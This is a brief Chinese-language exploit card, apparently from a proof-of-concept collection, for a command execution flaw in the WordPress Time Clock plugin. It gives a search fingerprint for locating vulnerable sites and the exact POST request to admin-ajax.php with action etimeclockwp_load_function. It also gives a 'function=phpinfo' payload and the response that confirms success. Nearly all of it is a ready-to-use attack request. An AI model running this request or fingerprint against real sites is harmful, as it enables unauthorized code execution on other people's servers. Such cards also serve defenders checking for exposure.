# WordPressTimeClock插件存在命令执行漏洞

WordPress ｜ 命令执行 ｜ —
- **指纹**：`body="/wp-content/plugins/time-clock/"`
- **请求**：`POST /wp-admin/admin-ajax.php?action=etimeclockwp_load_function HTTP/2`

**Payload**
```
function=phpinfo
```
- **响应特征**：200 phpinfo()